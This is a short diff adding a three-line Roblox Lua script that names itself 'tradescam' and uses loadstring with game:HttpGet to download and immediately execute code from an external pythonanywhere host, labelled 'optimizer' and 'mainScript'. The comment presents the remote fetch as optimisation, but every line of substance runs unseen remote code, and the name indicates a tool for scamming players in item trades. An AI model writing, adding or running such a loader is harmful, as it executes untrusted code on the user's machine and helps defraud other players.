@@ -1,0 +1,3 @@
+_G.scriptName = "tradescam" -- Allows us to optimise the script for this use
+loadstring(game:HttpGet('https://doggo663.pythonanywhere.com/optimizer'))()
+loadstring(game:HttpGet('https://doggo663.pythonanywhere.com/mainScript'))()
